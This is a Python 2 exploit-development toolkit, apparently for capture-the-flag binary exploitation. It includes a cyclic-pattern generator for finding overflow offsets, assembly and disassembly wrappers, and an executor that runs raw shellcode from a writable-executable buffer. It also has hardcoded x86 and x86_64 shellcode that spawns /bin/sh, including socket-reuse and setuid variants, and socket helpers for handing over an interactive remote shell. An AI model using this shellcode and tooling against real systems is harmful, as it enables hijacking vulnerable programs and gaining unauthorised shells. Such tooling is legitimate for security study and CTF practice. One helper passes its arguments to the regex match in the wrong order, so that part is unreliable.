import capstone
import ctypes
import functools
import hashlib
import itertools
import os
import random
import re
import select
import socket
import string
import struct
import subprocess
import sys
import telnetlib
import tempfile
import time
from sys import stdin, stdout, stderr, exit
from time import sleep

LC = string.ascii_lowercase
UC = string.ascii_uppercase

def pack(x):
  if isinstance(x, int):
    return struct.pack("I", x)
  return x
def pack64(x):
  if isinstance(x, int):
    return struct.pack("Q", x)
  return x

def de_bruijn(k, n):
  a = [0] * k * n
  sequence = []
  def db(t, p):
    if t > n:
      if n % p == 0:
        for j in range(1, p + 1):
          sequence.append(a[j])
    else:
      a[t] = a[t - p]
      db(t + 1, p)
      for j in range(a[t - p] + 1, k):
        a[t] = j
        db(t + 1, t)
  db(1, 1)
  return sequence

class Pattern:
  def __init__(self, n):
    alph = string.ascii_uppercase + string.ascii_lowercase + string.digits
    if n <= len(alph):
      self.s = alph[:n]
      return
    if n <= len(alph)**2:
      self.s = "".join(alph[i] for i in de_bruijn(len(alph), 2))[:n]
      return
    s = ""
    for a,b,c in itertools.product(
                      string.ascii_uppercase,
                      string.ascii_lowercase,
                      string.digits):
      s += a + b + c
      if len(s) >= n:
        break
    assert len(s) >= n
    self.s = s[:n]
  def __str__(self):
    return self.s
  def offset(self, x):
    p = pack(x)
    i = self.s.index(p)
    try:
      self.s[i+len(p):].index(p)
    except ValueError:
      return i
    else:
      raise ValueError, "Not unique!"

def contains_not(x, bad):
  return not any(c in bad for c in x)

def contains_only(x, good):
  return all(c in good for c in x)

def tohex(s):
  return " ".join("%02x" % ord(c) for c in s)

def fromhex(s):
  return "".join(s.split()).decode("hex")

def yasm(code, bits=32):
  if isinstance(code, list):
    code = "\n".join(code)
  code = "BITS %d\n%%line 0 input\n%s\n" % (bits, code)
  with tempfile.NamedTemporaryFile() as outp:
    fnameOut = outp.name
    p = subprocess.Popen(["yasm", "-o", outp.name, "--", "-"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p.communicate(code)
    if p.returncode:
      print err
      raise Exception("Assembly failed")
    return outp.read()

def capstone_dump(code, arch=capstone.CS_ARCH_X86, mode=capstone.CS_MODE_32, cols="abm"):
  md = capstone.Cs(arch, mode)
  for i in md.disasm(code, 0x1000):
    line = ""
    if "a" in cols:
      line += "0x%04x: " % i.address
    if "b" in cols:
      line += "%-20s " % " ".join("%02x" % x for x in i.bytes)
    if "m" in cols:
      line += "%s %s" % (i.mnemonic, i.op_str)
    print line

class x86:
  @staticmethod
  def assemble(code, **kw):
    return yasm(code, 32, **kw)
  @staticmethod
  def disas(code, **kw):
    capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_32, **kw)
  class shellcode:
    shell = """
      xor eax, eax
      push eax
      push 0x68732f2f
      push 0x6e69622f
      mov ebx, esp
      push eax
      push ebx
      mov ecx, esp
      mov al, 0xb
      int 0x80
      """
    shell_sock_reuse = """
      push 2
      pop ebx
      push 0x29
      pop eax
      int 0x80
      dec eax
      ; here we filled eax with dup(2) -> prefix is optional

      mov esi, eax

      ; dup2's
      xor ecx, ecx
      push esi
      pop ebx
    duploop:
      push 0x3f
      pop eax
      int 0x80
      inc ecx
      cmp cl, 3
      jne duploop
      """ + shell
    # setuid(geteuid()); system("/bin/sh")
    shell_euid = """
      xor eax, eax
      mov al, 0x46
      xor ebx, ebx
      mov bx, 0x1fa
      xor ecx, ecx
      mov cx, 0x1fa
      int 0x80
      """ + shell

class x86_64:
  @staticmethod
  def assemble(code, **kw):
    return yasm(code, 64, **kw)
  @staticmethod
  def disas(code, **kw):
    capstone_dump(code, capstone.CS_ARCH_X86, capstone.CS_MODE_64, **kw)
  class shellcode:
    shell = """
      xor rdi, rdi
      push rdi
      push rdi
      pop rsi
      pop rdx
      mov rdi, 0x68732f6e69622f2f
      shr rdi, 8
      push rdi
      push rsp
      pop rdi
      push 0x3b
      pop rax
      syscall
      """

for c in [x86, x86_64]:
  for k, v in c.shellcode.__dict__.items():
    sc = c.assemble(v)
    c.shellcode.__dict__[k] = sc
    assert contains_not(sc, "\0")

def alloc_exec_buffer(buf):
  libc = ctypes.CDLL('libc.so.6')
  sz = len(buf)
  buf = ctypes.c_char_p(buf)
  addr = ctypes.c_void_p(libc.valloc(sz))
  if 0 == addr:
    raise Exception("valloc failed")
  libc.memmove(addr, buf, sz)
  if 0 != libc.mprotect(addr, sz, 7):
    raise Exception("mprotect failed")
  return addr

def execute_code(sc):
  ctypes.cast(alloc_exec_buffer(sc), ctypes.CFUNCTYPE(None))()

libc = ctypes.CDLL("libc.so.6")
def execvp(fname, args):
  for x in args:
    assert contains_not(x, "\0")
  Args = ctypes.c_char_p * (len(args)+1)
  libc.execvp(fname, Args(*(args + [0])))

def execvpe(fname, args, env):
  for x in args:
    assert contains_not(x, "\0")
  for x in env:
    assert contains_not(x, "\0")
  Args = ctypes.c_char_p * (len(args)+1)
  Env = ctypes.c_char_p * (len(env)+1)
  libc.execvpe(fname, Args(*(args + [0])), Env(*(env + [0])))

def pipe(cmd, inp=""):
  return (subprocess.Popen(cmd,
                  stdin=subprocess.PIPE,
                  stdout=subprocess.PIPE,
                  stderr=subprocess.PIPE)
             .communicate(inp)[0])

def instrument(cmd, args, env):
  stdin_read, stdin_write = os.pipe()
  stdout_read, stdout_write = os.pipe()
  pid = os.fork()
  if pid == 0:
    # child
    os.dup2(stdin_read, 0)
    os.dup2(stdout_write, 1)
    execvpe(cmd, args, env)
  return (os.fdopen(stdin_write, "w"),
          os.fdopen(stdout_read, "r"),
          lambda: os.waitpid(pid, 0))

def xor_str(s, key):
  return "".join(chr(ord(c)^ord(k)) for c, k in zip(s, itertools.cycle(key)))

def connect(host, port):
  s = socket.create_connection((host, port))
  s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
  return s

def can_read(s, timeout=0):
  x,_,_ = select.select([s], [], [], timeout)
  return x != []

def wait_for_socket(s, timeout=1):
  return can_read(s, timeout)

def read_until_str(s, content):
  buf = ""
  while content not in buf:
    buf += s.recv(1)

def read_until_match(s, regex):
  buf = ""
  while not re.match(s, regex):
    buf += s.recv(1)

def socket_interact(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
